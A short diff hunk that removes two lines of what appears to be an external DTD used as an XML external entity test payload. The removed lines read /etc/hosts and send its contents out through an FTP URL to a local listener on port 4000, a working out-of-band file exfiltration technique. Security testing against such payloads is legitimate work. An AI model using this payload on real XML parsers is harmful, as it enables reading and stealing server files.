@@ -1,2 +1,0 @@
-<!ENTITY % data SYSTEM "file:///etc/hosts">
-<!ENTITY % extract "<!ENTITY exfil SYSTEM 'ftp://localhost:4000/?%data;'>">
